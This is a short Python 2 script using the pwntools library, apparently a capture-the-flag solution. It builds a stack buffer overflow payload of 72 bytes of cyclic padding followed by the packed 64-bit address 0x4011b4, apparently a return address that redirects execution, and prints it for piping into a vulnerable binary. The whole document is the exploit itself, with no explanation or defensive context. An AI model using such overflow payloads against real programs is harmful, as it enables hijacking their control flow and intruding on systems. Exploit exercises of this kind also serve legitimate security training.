from pwn import *


payload = ""
payload += cyclic(72)
payload += p64(0x4011b4)

print payload